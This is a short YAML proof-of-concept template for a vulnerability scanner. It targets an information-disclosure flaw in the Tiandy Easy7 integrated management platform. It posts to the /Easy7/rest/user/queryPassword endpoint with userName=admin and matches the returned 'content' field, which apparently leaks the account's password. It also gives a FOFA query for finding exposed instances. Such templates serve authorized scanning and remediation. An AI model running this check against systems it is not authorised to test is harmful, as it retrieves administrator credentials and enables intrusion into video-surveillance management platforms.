id: poc-yaml-tiandy-easy7-imp-querypassword-info-leak
info:
  name: 天地伟业Easy7综合管理平台 queryPassword 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: Easy7综合管理平台
  fofa: app="Tiandy-Easy7"
requests:
- method: POST
  path: /Easy7/rest/user/queryPassword
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: userName=xxxxxxxxxx
  expression: status_code == 200 && contains(body,"\"content\":null")
- method: POST
  path: /Easy7/rest/user/queryPassword
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: userName=admin
  expression: status_code == 200 && !contains(body,"<") && matches(body,"\"content\":\"(.*?)\"")
variables: {}
transport: http
